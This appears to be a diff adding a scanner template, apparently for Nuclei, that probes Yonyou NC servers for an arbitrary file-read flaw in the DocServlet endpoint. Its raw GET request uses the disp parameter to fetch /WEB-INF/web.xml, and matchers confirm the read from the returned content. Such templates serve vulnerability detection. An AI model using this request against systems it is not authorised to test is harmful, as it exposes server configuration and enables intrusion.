@@ -1,0 +1,22 @@
+id: yongyou-nc-fileread-nc_uap_lfw_file_action_DocServlet
+
+info:
+  name: yongyou-nc-fileread-nc_uap_lfw_file_action_DocServlet
+  author: yongyou-nc-fileread-nc_uap_lfw_file_action_DocServlet
+  severity: high
+
+requests:
+  - raw:
+      - |+
+        GET /servlet/~webrt/nc.uap.lfw.file.action.DocServlet?disp=/WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 0
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains_all(body, 'nc.bs.framework.server.WebApplicationStartupHook','nc.bs.framework.server.LoggerServletFilte') && status_code==200 && contains(header,'application/xml')"
